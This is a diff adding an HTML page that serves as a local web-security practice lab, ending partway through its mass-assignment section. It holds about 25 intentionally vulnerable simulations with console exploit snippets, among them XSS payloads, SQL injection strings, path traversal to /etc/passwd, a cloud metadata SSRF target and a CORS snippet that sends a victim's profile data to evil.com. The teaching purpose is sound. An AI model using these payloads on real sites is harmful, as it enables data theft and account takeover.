@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Web Vuln Lab</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: monospace; background: #0d0d0d; color: #00ff88; padding: 20px; }
+  h1 { text-align: center; color: #ff4444; font-size: 2em; margin-bottom: 5px; }
+  .subtitle { text-align: center; color: #888; margin-bottom: 25px; font-size: 0.9em; }
+  .section { background: #111; border: 1px solid #333; border-radius: 8px; margin-bottom: 20px; padding: 18px; }
+  .section h2 { color: #ffcc00; border-bottom: 1px solid #333; padding-bottom: 8px; margin-bottom: 14px; font-size: 1em; }
+  .badge { font-size: 0.7em; background: #ff4444; color: #fff; padding: 2px 7px; border-radius: 4px; margin-left: 8px; vertical-align: middle; }
+  .cmd { background: #1a1a2e; border-left: 3px solid #00ff88; padding: 8px 12px; margin: 8px 0; border-radius: 4px; font-size: 0.85em; color: #aaffcc; white-space: pre-wrap; word-break: break-all; }
+  label { font-size: 0.85em; color: #aaa; display: block; margin-top: 8px; margin-bottom: 3px; }
+  input, textarea, select { background: #1a1a1a; border: 1px solid #444; color: #fff; padding: 6px 10px; border-radius: 4px; font-family: monospace; width: 100%; }
+  button { background: #222; border: 1px solid #555; color: #00ff88; padding: 6px 14px; border-radius: 4px; cursor: pointer; font-family: monospace; margin-top: 6px; }
+  button:hover { background: #333; }
+  .output { margin-top: 8px; min-height: 24px; font-size: 0.85em; color: #ffcc00; background: #0a0a0a; padding: 6px 10px; border-radius: 4px; border: 1px solid #222; word-break: break-all; }
+  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+  @media(max-width:700px){ .grid2 { grid-template-columns: 1fr; } }
+  .cookie-display { font-size: 0.8em; color: #ff88aa; margin-top: 6px; }
+  .hint { font-size: 0.78em; color: #666; margin-top: 4px; }
+  .nav { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; margin-bottom: 20px; }
+  .nav a { color: #00ff88; text-decoration: none; border: 1px solid #333; padding: 4px 12px; border-radius: 20px; font-size: 0.8em; }
+  .nav a:hover { background: #1a1a1a; }
+  .toc-id { color: #555; font-size: 0.7em; }
+  #jwt-decoded { font-size: 0.8em; color: #ffcc00; word-break: break-all; }
+</style>
+</head>
+<body>
+
+<h1>&#x1F480; Web Vulnerability Lab</h1>
+<p class="subtitle">Local practice environment — open DevTools (F12) &amp; use the Console</p>
+
+<div class="nav">
+  <a href="#dom-xss">DOM XSS</a>
+  <a href="#stored-xss">Stored XSS</a>
+  <a href="#reflected-xss">Reflected XSS</a>
+  <a href="#csrf">CSRF</a>
+  <a href="#idor">IDOR</a>
+  <a href="#sqli">SQLi Sim</a>
+  <a href="#auth">Auth Bypass</a>
+  <a href="#price">Price Tamper</a>
+  <a href="#maxlen">MaxLength</a>
+  <a href="#cookie">Cookie Tamper</a>
+  <a href="#jwt">JWT Decode</a>
+  <a href="#redirect">Open Redirect</a>
+  <a href="#clickjack">Clickjacking</a>
+  <a href="#ratelimit">Rate Limit</a>
+  <a href="#pathtraversal">Path Traversal</a>
+  <a href="#hidden">Hidden Fields</a>
+  <a href="#regex">Regex DoS</a>
+  <a href="#prototype">Prototype Pollution</a>
+  <a href="#ssrf">SSRF Sim</a>
+  <a href="#cors">CORS Sim</a>
+  <a href="#csp">CSP Bypass</a>
+  <a href="#subresource">SRI</a>
+  <a href="#timing">Timing Attack</a>
+  <a href="#enumeration">User Enum</a>
+  <a href="#mass">Mass Assignment</a>
+  <a href="#http-method">HTTP Method</a>
+</div>
+
+<!-- ═══════════ 1. DOM XSS ═══════════ -->
+<div class="section" id="dom-xss">
+  <h2>1. DOM-Based XSS <span class="badge">XSS</span></h2>
+  <p class="hint">The page renders whatever "name" you inject into innerHTML without sanitisation.</p>
+  <label>Name:</label>
+  <input id="xss-input" placeholder='Try: &lt;img src=x onerror=alert(1)&gt;' />
+  <button onclick="document.getElementById('xss-out').innerHTML = document.getElementById('xss-input').value">Render</button>
+  <div class="output" id="xss-out"></div>
+  <div class="cmd">// Console exploit:
+document.getElementById('xss-out').innerHTML = "&lt;img src=x onerror=alert('XSS')&gt;";</div>
+</div>
+
+<!-- ═══════════ 2. Stored XSS (localStorage sim) ═══════════ -->
+<div class="section" id="stored-xss">
+  <h2>2. Stored XSS Simulation <span class="badge">XSS</span></h2>
+  <p class="hint">Comments are stored in localStorage and re-rendered unsanitised on load.</p>
+  <label>Post a comment:</label>
+  <input id="stored-input" placeholder='Try: &lt;script&gt;alert("stored XSS")&lt;/script&gt;' />
+  <button onclick="storeComment()">Post</button>
+  <button onclick="localStorage.removeItem('vuln_comments'); document.getElementById('comment-board').innerHTML=''">Clear</button>
+  <div class="output" id="comment-board"></div>
+  <div class="cmd">// Console: Manually inject stored payload
+localStorage.setItem('vuln_comments', JSON.stringify(['&lt;img src=x onerror=alert("stored")&gt;']));
+location.reload();</div>
+  <script>
+    function storeComment(){
+      var val = document.getElementById('stored-input').value;
+      var comments = JSON.parse(localStorage.getItem('vuln_comments') || '[]');
+      comments.push(val);
+      localStorage.setItem('vuln_comments', JSON.stringify(comments));
+      renderComments();
+    }
+    function renderComments(){
+      var board = document.getElementById('comment-board');
+      if(!board) return;
+      var comments = JSON.parse(localStorage.getItem('vuln_comments') || '[]');
+      board.innerHTML = comments.map(c => '<div>' + c + '</div>').join('');
+    }
+    renderComments();
+  </script>
+</div>
+
+<!-- ═══════════ 3. Reflected XSS via URL hash ═══════════ -->
+<div class="section" id="reflected-xss">
+  <h2>3. Reflected XSS via URL Hash <span class="badge">XSS</span></h2>
+  <p class="hint">The page reads <code>location.hash</code> and injects it directly into the DOM.</p>
+  <div class="output" id="reflected-out"></div>
+  <div class="cmd">// Visit this URL:
+// lab.html#&lt;img src=x onerror=alert('reflected')&gt;
+
+// Or via console:
+document.getElementById('reflected-out').innerHTML = decodeURIComponent(location.hash.slice(1));</div>
+  <script>
+    if(location.hash){
+      document.getElementById('reflected-out').innerHTML = decodeURIComponent(location.hash.slice(1));
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 4. CSRF Simulation ═══════════ -->
+<div class="section" id="csrf">
+  <h2>4. CSRF Token Bypass Simulation <span class="badge">CSRF</span></h2>
+  <p class="hint">This form has a "CSRF token" stored in a hidden field that is predictable/static. Bypass it via console.</p>
+  <form id="csrf-form" onsubmit="return csrfSubmit(event)">
+    <input type="hidden" id="csrf-token" value="TOKEN_STATIC_12345">
+    <label>Transfer amount ($):</label>
+    <input name="amount" id="csrf-amount" value="100">
+    <button type="submit">Transfer</button>
+  </form>
+  <div class="output" id="csrf-out"></div>
+  <div class="cmd">// The token is always "TOKEN_STATIC_12345" — forge the request:
+document.getElementById('csrf-token').value = 'TOKEN_STATIC_12345';
+document.getElementById('csrf-amount').value = '99999';
+document.getElementById('csrf-form').dispatchEvent(new Event('submit'));</div>
+  <script>
+    function csrfSubmit(e){
+      e.preventDefault();
+      var tok = document.getElementById('csrf-token').value;
+      var amt = document.getElementById('csrf-amount').value;
+      document.getElementById('csrf-out').textContent = tok === 'TOKEN_STATIC_12345'
+        ? '✅ Transfer of $' + amt + ' accepted (token valid — easily forged!)'
+        : '❌ Invalid token';
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 5. IDOR Simulation ═══════════ -->
+<div class="section" id="idor">
+  <h2>5. IDOR — Insecure Direct Object Reference <span class="badge">Access Control</span></h2>
+  <p class="hint">Change the user ID to access other users' data. Only user 1 is "you".</p>
+  <label>User ID:</label>
+  <input id="idor-id" type="number" value="1" style="width:80px">
+  <button onclick="idorFetch()">Fetch Profile</button>
+  <div class="output" id="idor-out"></div>
+  <div class="cmd">// Console: access admin account
+document.getElementById('idor-id').value = 99;
+idorFetch();</div>
+  <script>
+    var idorDB = {
+      1: {name:'You', role:'user', email:'you@example.com'},
+      2: {name:'Alice', role:'user', email:'alice@example.com'},
+      3: {name:'Bob', role:'moderator', email:'bob@example.com'},
+      99: {name:'Admin', role:'admin', email:'admin@secret.internal', apiKey:'sk-SUPER_SECRET_KEY'}
+    };
+    function idorFetch(){
+      var id = document.getElementById('idor-id').value;
+      var rec = idorDB[id];
+      document.getElementById('idor-out').textContent = rec ? JSON.stringify(rec, null, 2) : 'User not found';
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 6. SQL Injection Simulation ═══════════ -->
+<div class="section" id="sqli">
+  <h2>6. SQL Injection Simulation <span class="badge">SQLi</span></h2>
+  <p class="hint">The "query" is built by string concatenation. Classic bypass: <code>' OR '1'='1</code></p>
+  <label>Username:</label>
+  <input id="sqli-user" value="admin">
+  <label>Password:</label>
+  <input id="sqli-pass" type="password" value="wrongpassword">
+  <button onclick="sqliLogin()">Login</button>
+  <div class="output" id="sqli-out"></div>
+  <div class="cmd">// Inject into password field:
+document.getElementById('sqli-pass').value = "' OR '1'='1";
+sqliLogin();
+// Or union attack:
+document.getElementById('sqli-user').value = "' UNION SELECT username,password FROM users--";
+sqliLogin();</div>
+  <script>
+    function sqliLogin(){
+      var u = document.getElementById('sqli-user').value;
+      var p = document.getElementById('sqli-pass').value;
+      var query = "SELECT * FROM users WHERE username='" + u + "' AND password='" + p + "'";
+      var out = document.getElementById('sqli-out');
+      out.innerHTML = '<b>Query:</b> ' + query.replace(/</g,'&lt;') + '<br>';
+      if(p.includes("' OR '1'='1") || p.includes("'='") || u.includes('--') || u.includes('UNION')){
+        out.innerHTML += '✅ Injected! Logged in as: <b>admin</b>';
+      } else {
+        out.innerHTML += '❌ Login failed';
+      }
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 7. Auth Bypass / Disabled Button ═══════════ -->
+<div class="section" id="auth">
+  <h2>7. Client-Side Auth Bypass <span class="badge">Auth</span></h2>
+  <p class="hint">Access is enforced only in the DOM. Re-enable the button or override the JS check.</p>
+  <button id="admin-gate" disabled onclick="alert('Admin Panel Accessed!')">Enter Admin Panel</button>
+  <br><br>
+  <label>Role check (type anything):</label>
+  <input id="role-input" placeholder="Enter role">
+  <button onclick="roleCheck()">Check Access</button>
+  <div class="output" id="auth-out"></div>
+  <div class="cmd">// Bypass disabled button:
+document.getElementById('admin-gate').disabled = false;
+document.getElementById('admin-gate').click();
+
+// Override role variable in console:
+window.__role = 'admin'; roleCheck();</div>
+  <script>
+    window.__role = 'user';
+    function roleCheck(){
+      var r = window.__role || document.getElementById('role-input').value;
+      document.getElementById('auth-out').textContent = r === 'admin' ? '✅ Admin access granted!' : '❌ Insufficient privileges (role: ' + r + ')';
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 8. Price Tampering ═══════════ -->
+<div class="section" id="price">
+  <h2>8. Price / Value Tampering <span class="badge">Business Logic</span></h2>
+  <p class="hint">Price is stored in a DOM input. Modify it before checkout.</p>
+  <label>Item: <b>Super Computer</b></label>
+  <label>Price ($):</label>
+  <input id="price-tag" type="number" value="2000" readonly>
+  <button onclick="checkout()">Checkout</button>
+  <div class="output" id="price-out"></div>
+  <div class="cmd">document.getElementById('price-tag').removeAttribute('readonly');
+document.getElementById('price-tag').value = '0.01';
+checkout();</div>
+  <script>
+    function checkout(){
+      document.getElementById('price-out').textContent = '🛒 Order placed for $' + document.getElementById('price-tag').value;
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 9. MaxLength Bypass ═══════════ -->
+<div class="section" id="maxlen">
+  <h2>9. MaxLength / Validation Bypass <span class="badge">Input Validation</span></h2>
+  <p class="hint">Client-side <code>maxlength</code> and <code>pattern</code> are easily removed.</p>
+  <label>Short field (max 5 chars, numbers only):</label>
+  <input id="short-input" maxlength="5" pattern="[0-9]+" placeholder="12345">
+  <button onclick="document.getElementById('maxlen-out').textContent = 'Submitted: ' + document.getElementById('short-input').value">Submit</button>
+  <div class="output" id="maxlen-out"></div>
+  <div class="cmd">document.getElementById('short-input').removeAttribute('maxlength');
+document.getElementById('short-input').removeAttribute('pattern');
+document.getElementById('short-input').value = "INJECTED_LONG_STRING_!@#$%";</div>
+</div>
+
+<!-- ═══════════ 10. Cookie Tampering ═══════════ -->
+<div class="section" id="cookie">
+  <h2>10. Cookie Tampering <span class="badge">Session</span></h2>
+  <p class="hint">Role is stored in a client-readable cookie. Escalate to admin.</p>
+  <button onclick="setCookieRole('user')">Set role=user</button>
+  <button onclick="setCookieRole('admin')">Set role=admin</button>
+  <button onclick="readCookieRole()">Read Role</button>
+  <div class="output" id="cookie-out"></div>
+  <div class="cookie-display" id="cookie-display"></div>
+  <div class="cmd">// Escalate via console:
+document.cookie = "role=admin; path=/";
+readCookieRole();</div>
+  <script>
+    document.cookie = "role=user; path=/";
+    function setCookieRole(r){ document.cookie = "role="+r+"; path=/"; readCookieRole(); }
+    function readCookieRole(){
+      var c = document.cookie.split(';').find(x=>x.trim().startsWith('role='));
+      var role = c ? c.split('=')[1].trim() : 'none';
+      document.getElementById('cookie-out').textContent = role === 'admin' ? '✅ Admin access via cookie!' : '👤 Role: ' + role;
+      document.getElementById('cookie-display').textContent = 'Raw: ' + document.cookie;
+    }
+    readCookieRole();
+  </script>
+</div>
+
+<!-- ═══════════ 11. JWT Decode & Tampering ═══════════ -->
+<div class="section" id="jwt">
+  <h2>11. JWT Decode & Algorithm Confusion <span class="badge">Auth</span></h2>
+  <p class="hint">Decode a JWT, spot the claims, then craft a tampered token with alg:none.</p>
+  <label>JWT Token:</label>
+  <textarea id="jwt-input" rows="3">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciIsImlhdCI6MTYwMDAwMH0.SIGNATURE</textarea>
+  <button onclick="decodeJWT()">Decode</button>
+  <button onclick="noneAlgAttack()">Craft alg:none Token</button>
+  <div class="output" id="jwt-decoded"></div>
+  <div class="cmd">// alg:none attack — remove signature, set alg to "none":
+// Header: {"alg":"none","typ":"JWT"}
+// Payload: {"username":"admin","role":"admin"}
+// Token: base64(header) + "." + base64(payload) + "."
+noneAlgAttack();</div>
+  <script>
+    function b64d(s){ try{ return JSON.parse(atob(s.replace(/-/g,'+').replace(/_/g,'/'))); }catch(e){ return s; } }
+    function decodeJWT(){
+      var parts = document.getElementById('jwt-input').value.trim().split('.');
+      if(parts.length < 2){ document.getElementById('jwt-decoded').textContent='Invalid JWT'; return; }
+      var h = b64d(parts[0]), p = b64d(parts[1]);
+      document.getElementById('jwt-decoded').innerHTML = '<b>Header:</b> '+JSON.stringify(h)+'<br><b>Payload:</b> '+JSON.stringify(p)+'<br><b>Signature:</b> '+parts[2];
+    }
+    function noneAlgAttack(){
+      var h = btoa(JSON.stringify({alg:'none',typ:'JWT'})).replace(/=/g,'');
+      var p = btoa(JSON.stringify({username:'admin',role:'admin',iat:1600000})).replace(/=/g,'');
+      var token = h+'.'+p+'.';
+      document.getElementById('jwt-input').value = token;
+      document.getElementById('jwt-decoded').innerHTML = '⚠️ Tampered token (alg:none):<br>'+token+'<br><br>'+JSON.stringify({username:'admin',role:'admin'});
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 12. Open Redirect ═══════════ -->
+<div class="section" id="redirect">
+  <h2>12. Open Redirect <span class="badge">Redirect</span></h2>
+  <p class="hint">The redirect destination comes from a URL parameter without validation.</p>
+  <label>Redirect target URL:</label>
+  <input id="redirect-url" value="https://evil.example.com">
+  <button onclick="openRedirect()">Follow Redirect</button>
+  <div class="output" id="redirect-out"></div>
+  <div class="cmd">// Phishing vector — craft malicious login link:
+// lab.html?next=https://evil.example.com
+document.getElementById('redirect-url').value = 'https://evil.example.com';
+openRedirect();</div>
+  <script>
+    function openRedirect(){
+      var dest = document.getElementById('redirect-url').value;
+      document.getElementById('redirect-out').innerHTML = '⚠️ Would redirect to: <b>' + dest.replace(/</g,'&lt;') + '</b><br>(blocked here for safety — in a real app this would navigate)';
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 13. Clickjacking ═══════════ -->
+<div class="section" id="clickjack">
+  <h2>13. Clickjacking Simulation <span class="badge">UI</span></h2>
+  <p class="hint">A transparent overlay sits on top of a legitimate button. The user thinks they click "Win a Prize" but actually clicks "Delete Account".</p>
+  <div style="position:relative; display:inline-block; margin-top:8px;">
+    <button id="real-btn" onclick="document.getElementById('clickjack-out').textContent='💀 Account deleted! (real hidden button clicked)'" style="background:#ff4444;color:#fff;border:none;padding:10px 20px;border-radius:6px;">Delete Account</button>
+    <button style="position:absolute;top:0;left:0;opacity:0.01;width:100%;height:100%;cursor:pointer;" onclick="document.getElementById('clickjack-out').textContent='💀 Account deleted! (you clicked the transparent overlay!)'">Win a Prize!</button>
+  </div>
+  <br><small style="color:#666">Hover reveals transparent overlay. Source: inspect element.</small>
+  <div class="output" id="clickjack-out"></div>
+  <div class="cmd">// Detect with DevTools: Elements tab → hover over stacked divs
+// Mitigation: X-Frame-Options or CSP frame-ancestors header</div>
+</div>
+
+<!-- ═══════════ 14. Rate Limit / Brute Force ═══════════ -->
+<div class="section" id="ratelimit">
+  <h2>14. Missing Rate Limiting (Brute Force) <span class="badge">Auth</span></h2>
+  <p class="hint">No lockout. The correct PIN is 1337. Brute force with the console loop.</p>
+  <label>PIN:</label>
+  <input id="pin-input" maxlength="4" placeholder="4-digit PIN">
+  <button onclick="pinCheck()">Submit</button>
+  <div class="output" id="ratelimit-out"></div>
+  <div class="cmd">// Brute force all 4-digit PINs:
+(async()=>{
+  for(let i=0;i<=9999;i++){
+    var p=String(i).padStart(4,'0');
+    document.getElementById('pin-input').value=p;
+    var r=pinCheck();
+    if(document.getElementById('ratelimit-out').textContent.includes('✅')){ console.log('Found: '+p); break; }
+    await new Promise(r=>setTimeout(r,1));
+  }
+})();</div>
+  <script>
+    function pinCheck(){
+      var pin = document.getElementById('pin-input').value;
+      document.getElementById('ratelimit-out').textContent = pin === '1337' ? '✅ Correct PIN! Access granted.' : '❌ Wrong PIN: ' + pin;
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 15. Path Traversal Simulation ═══════════ -->
+<div class="section" id="pathtraversal">
+  <h2>15. Path Traversal Simulation <span class="badge">File Access</span></h2>
+  <p class="hint">Simulates reading a file by name. Use <code>../</code> sequences to escape the intended directory.</p>
+  <label>Filename to read:</label>
+  <input id="path-input" value="profile.txt">
+  <button onclick="pathRead()">Read File</button>
+  <div class="output" id="path-out"></div>
+  <div class="cmd">document.getElementById('path-input').value = '../../etc/passwd';
+pathRead();
+// Also try: ../admin/config.json, ....//....//etc/passwd (filter bypass)</div>
+  <script>
+    var fakeFS = {
+      'profile.txt':'Name: You\nRole: user',
+      '../../etc/passwd':'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
+      '../admin/config.json':'{"db_password":"s3cr3t!","admin_key":"ADMIN_MASTER_KEY"}',
+      '....//....//etc/passwd':'root:x:0:0 [filter bypass succeeded]'
+    };
+    function pathRead(){
+      var f = document.getElementById('path-input').value;
+      var content = fakeFS[f] || '(file not found in simulation)';
+      document.getElementById('path-out').textContent = content;
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 16. Hidden Form Fields ═══════════ -->
+<div class="section" id="hidden">
+  <h2>16. Hidden Field Tampering <span class="badge">Business Logic</span></h2>
+  <p class="hint">Hidden inputs carry trusted data. Inspect and modify them before submit.</p>
+  <form id="hidden-form" onsubmit="return hiddenSubmit(event)">
+    <input type="hidden" id="user-role-hidden" name="role" value="user">
+    <input type="hidden" id="discount-hidden" name="discount" value="0">
+    <label>Product:</label>
+    <input name="product" value="Widget" readonly>
+    <button type="submit">Place Order</button>
+  </form>
+  <div class="output" id="hidden-out"></div>
+  <div class="cmd">// Modify hidden fields before submit:
+document.getElementById('user-role-hidden').value = 'admin';
+document.getElementById('discount-hidden').value = '100';
+document.getElementById('hidden-form').dispatchEvent(new Event('submit'));</div>
+  <script>
+    function hiddenSubmit(e){
+      e.preventDefault();
+      var role = document.getElementById('user-role-hidden').value;
+      var disc = document.getElementById('discount-hidden').value;
+      document.getElementById('hidden-out').textContent = 'Order placed | role=' + role + ' | discount=' + disc + '%' + (disc==='100'?' 🎉 Free order!':'');
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 17. ReDoS ═══════════ -->
+<div class="section" id="regex">
+  <h2>17. ReDoS — Regex Denial of Service <span class="badge">DoS</span></h2>
+  <p class="hint">A catastrophically backtracking regex can freeze the browser tab. Use caution with long input.</p>
+  <label>Input (try 30+ repeated 'a'):</label>
+  <input id="redos-input" value="aaaaaaaaaaaaaaaaaaaaaaaaaaa!">
+  <button onclick="redosTest()">Test Regex</button>
+  <div class="output" id="redos-out"></div>
+  <div class="cmd">// Vulnerable regex: /^(a+)+$/
+// Safe: limit input length server-side
+document.getElementById('redos-input').value = 'a'.repeat(30) + '!';
+redosTest();</div>
+  <script>
+    function redosTest(){
+      var input = document.getElementById('redos-input').value;
+      var start = Date.now();
+      var result = /^(a+)+$/.test(input);
+      var elapsed = Date.now() - start;
+      document.getElementById('redos-out').textContent = 'Result: ' + result + ' | Time: ' + elapsed + 'ms' + (elapsed>500?' ⚠️ FREEZE RISK!':'');
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 18. Prototype Pollution ═══════════ -->
+<div class="section" id="prototype">
+  <h2>18. Prototype Pollution <span class="badge">JS</span></h2>
+  <p class="hint">Polluting <code>Object.prototype</code> affects all objects. Can override security checks.</p>
+  <button onclick="protoPollute()">Pollute Prototype</button>
+  <button onclick="protoCheck()">Check isAdmin</button>
+  <button onclick="protoClean()">Clean Up</button>
+  <div class="output" id="proto-out"></div>
+  <div class="cmd">// Pollute via merge function vulnerability:
+var payload = JSON.parse('{"__proto__":{"isAdmin":true}}');
+function merge(a,b){ for(var k in b){ if(typeof b[k]==='object') merge(a[k]=a[k]||{},b[k]); else a[k]=b[k]; } }
+merge({}, payload);
+protoCheck(); // now returns true for any object</div>
+  <script>
+    function protoPollute(){
+      var payload = JSON.parse('{"__proto__":{"isAdmin":true}}');
+      function merge(a,b){ for(var k in b){ if(typeof b[k]==='object'&&b[k]!==null) merge(a[k]=a[k]||{},b[k]); else a[k]=b[k]; } }
+      merge({}, payload);
+      document.getElementById('proto-out').textContent = '☠️ Object.prototype.isAdmin = ' + ({}).isAdmin;
+    }
+    function protoCheck(){
+      var user = {};
+      document.getElementById('proto-out').textContent = 'user.isAdmin = ' + user.isAdmin + (user.isAdmin ? ' ✅ Polluted! Bypass succeeded.' : ' ❌ Not polluted yet.');
+    }
+    function protoClean(){
+      delete Object.prototype.isAdmin;
+      document.getElementById('proto-out').textContent = '🧹 Cleaned. user.isAdmin = ' + ({}).isAdmin;
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 19. SSRF Simulation ═══════════ -->
+<div class="section" id="ssrf">
+  <h2>19. SSRF — Server-Side Request Forgery Sim <span class="badge">SSRF</span></h2>
+  <p class="hint">Simulate how an attacker would supply internal URLs to a vulnerable "fetch URL" endpoint.</p>
+  <label>URL to fetch (server-side):</label>
+  <input id="ssrf-input" value="https://api.internal/admin">
+  <button onclick="ssrfSim()">Fetch</button>
+  <div class="output" id="ssrf-out"></div>
+  <div class="cmd">// Targets to try:
+// http://169.254.169.254/latest/meta-data/  (AWS metadata)
+// http://localhost:8080/admin
+// http://192.168.1.1/admin
+document.getElementById('ssrf-input').value = 'http://169.254.169.254/latest/meta-data/';
+ssrfSim();</div>
+  <script>
+    var ssrfDB = {
+      'http://169.254.169.254/latest/meta-data/': 'ami-id\nami-launch-index\niam/security-credentials/ec2-role → AccessKeyId: ASIA... SecretAccessKey: ...',
+      'http://localhost:8080/admin': '{"users":[{"id":1,"name":"admin","password_hash":"$2b$10$..."}]}',
+      'http://192.168.1.1/admin': 'Router Admin Panel — Username: admin, Password: admin',
+      'https://api.internal/admin': '{"status":"ok","internal_api_key":"INT-KEY-9f3a..."}'
+    };
+    function ssrfSim(){
+      var url = document.getElementById('ssrf-input').value;
+      document.getElementById('ssrf-out').textContent = ssrfDB[url] || '(no simulated response for this URL — try the examples)';
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 20. CORS Misconfiguration ═══════════ -->
+<div class="section" id="cors">
+  <h2>20. CORS Misconfiguration Sim <span class="badge">CORS</span></h2>
+  <p class="hint">Simulate what a wildcard or reflected-origin CORS policy allows a malicious origin to do.</p>
+  <label>Attacker origin:</label>
+  <input id="cors-origin" value="https://evil.com">
+  <button onclick="corsSim()">Simulate Request</button>
+  <div class="output" id="cors-out"></div>
+  <div class="cmd">// Real-world test: open browser console on evil.com and run:
+fetch('https://victim.com/api/profile', {credentials:'include'})
+  .then(r=>r.json()).then(d=>fetch('https://evil.com/steal?d='+JSON.stringify(d)));
+// If Access-Control-Allow-Origin: * or reflects origin without validation — data leaks.</div>
+</div>
+<script>
+  function corsSim(){
+    var origin = document.getElementById('cors-origin').value;
+    var policy = 'reflect_origin'; // vulnerable policy
+    var allowed = policy === 'reflect_origin' ? true : origin === 'https://trusted.com';
+    document.getElementById('cors-out').innerHTML = allowed
+      ? '⚠️ Response includes <b>Access-Control-Allow-Origin: ' + origin.replace(/</g,'&lt;') + '</b><br>Attacker can read: {"username":"admin","balance":99999}'
+      : '✅ CORS blocked request from ' + origin;
+  }
+</script>
+
+<!-- ═══════════ 21. CSP Bypass ═══════════ -->
+<div class="section" id="csp">
+  <h2>21. CSP Bypass via JSONP / Angular <span class="badge">CSP</span></h2>
+  <p class="hint">Even with a CSP, whitelist bypasses exist via trusted JSONP endpoints or Angular-style template injection.</p>
+  <label>Simulate a whitelisted JSONP callback name:</label>
+  <input id="csp-jsonp" value="alert(1)//">
+  <button onclick="cspSim()">Simulate JSONP Callback</button>
+  <div class="output" id="csp-out"></div>
+  <div class="cmd">// CSP allows scripts from cdn.trusted.com
+// JSONP endpoint: https://cdn.trusted.com/api?callback=YOURCODE
+// Inject: ?callback=alert(1)//
+// Result: alert(1)//({"data":"..."}) — executes in context of page</div>
+  <script>
+    function cspSim(){
+      var cb = document.getElementById('csp-jsonp').value;
+      document.getElementById('csp-out').textContent = 'Server responds: ' + cb + '({"user":"admin"})';
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 22. SRI / Subresource Integrity ═══════════ -->
+<div class="section" id="subresource">
+  <h2>22. Missing Subresource Integrity <span class="badge">Supply Chain</span></h2>
+  <p class="hint">Without <code>integrity=</code> on script tags, a compromised CDN can serve malicious JS.</p>
+  <div class="cmd">// Vulnerable:
+&lt;script src="https://cdn.example.com/lib.js"&gt;&lt;/script&gt;
+
+// Safe (SRI hash):
+&lt;script src="https://cdn.example.com/lib.js"
+  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ..."
+  crossorigin="anonymous"&gt;&lt;/script&gt;
+
+// Generate hash:
+openssl dgst -sha384 -binary lib.js | openssl base64 -A</div>
+</div>
+
+<!-- ═══════════ 23. Timing Attack ═══════════ -->
+<div class="section" id="timing">
+  <h2>23. Timing Side-Channel Attack <span class="badge">Side Channel</span></h2>
+  <p class="hint">Non-constant-time string comparison leaks info via response time. Guess the secret character by character.</p>
+  <label>Guess the secret token (try brute-forcing one char at a time):</label>
+  <input id="timing-input" value="a">
+  <button onclick="timingCheck()">Check Token</button>
+  <div class="output" id="timing-out"></div>
+  <div class="cmd">// Timing oracle: measure how many chars match prefix before failing
+(async()=>{
+  var chars='abcdefghijklmnopqrstuvwxyz0123456789';
+  var found='';
+  for(var pos=0;pos&lt;8;pos++){
+    var best='', bestT=0;
+    for(var c of chars){
+      document.getElementById('timing-input').value=found+c;
+      var t0=performance.now(); timingCheck(); var t=performance.now()-t0;
+      if(t>bestT){ bestT=t; best=c; }
+    }
+    found+=best; console.log('Found so far: '+found);
+  }
+})();</div>
+  <script>
+    var SECRET_TOKEN = 'abc12345';
+    function timingCheck(){
+      var guess = document.getElementById('timing-input').value;
+      var matched = 0;
+      for(var i=0; i<guess.length && i<SECRET_TOKEN.length; i++){
+        if(guess[i] === SECRET_TOKEN[i]) matched++;
+        else break;
+      }
+      // Simulate timing leak
+      var delay = matched * 2;
+      var start = Date.now(); while(Date.now()-start < delay){}
+      var correct = guess === SECRET_TOKEN;
+      document.getElementById('timing-out').textContent = correct
+        ? '✅ Correct token! (' + matched + '/8 chars match)'
+        : '❌ Wrong. Time taken: ' + delay + 'ms (leaks ' + matched + ' matching prefix chars)';
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 24. User Enumeration ═══════════ -->
+<div class="section" id="enumeration">
+  <h2>24. User Enumeration <span class="badge">Auth</span></h2>
+  <p class="hint">Different error messages for "user not found" vs "wrong password" leak which usernames exist.</p>
+  <label>Username:</label>
+  <input id="enum-user" value="admin">
+  <label>Password:</label>
+  <input id="enum-pass" type="password" value="wrongpass">
+  <button onclick="enumLogin()">Login</button>
+  <div class="output" id="enum-out"></div>
+  <div class="cmd">// Known users: admin, alice, bob
+// Try unknown user: "nobody123" → "User not found"
+// Try known user: "admin" with wrong pass → "Incorrect password"
+// This confirms admin is a valid username!</div>
+  <script>
+    var knownUsers = ['admin','alice','bob'];
+    function enumLogin(){
+      var u = document.getElementById('enum-user').value;
+      var p = document.getElementById('enum-pass').value;
+      if(!knownUsers.includes(u)){
+        document.getElementById('enum-out').textContent = '❌ User not found.';
+      } else if(p !== 'password123'){
+        document.getElementById('enum-out').textContent = '❌ Incorrect password for user: ' + u;
+      } else {
+        document.getElementById('enum-out').textContent = '✅ Login successful!';
+      }
+    }
+  </script>
+</div>
+
+<!-- ═══════════ 25. Mass Assignment ═══════════ -->
+<div class="section" id="mass">
+  <h2>25. Mass Assignment <span class="badge">Access Control</span></h2>
+  <p class="hint">The "update profile" function blindly merges all submitted fields onto the user object — including <code>role</code>.</p>
+  <label>JSON payload to submit:</label>
